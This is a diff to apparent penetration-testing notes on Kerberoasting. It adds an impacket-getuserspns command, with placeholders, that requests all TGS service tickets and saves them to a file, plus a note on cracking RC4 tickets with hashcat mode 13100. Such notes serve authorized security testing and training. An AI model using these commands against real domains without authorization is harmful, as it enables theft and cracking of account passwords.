@@ -10,6 +10,11 @@ impacket-getuserspns -dc-ip <dcip> <domainname>/<username>
 
 -Using impacket-getuserspns to request all TGS ticket:
 ```
-impacket-getuserspns -dc-ip <dcip> <domainname>/<username> -request 
+impacket-getuserspns -dc-ip <dcip> <domainname>/<username> -request -outputfile <outputfilename>
 #We can specify user <username> at the end if we are only interested in one SPN
 ```
+
+Depending on what type of ticket we get, we use:
+
+etype23 - RC4 | hashcat mode 13100
+etype17 - AES
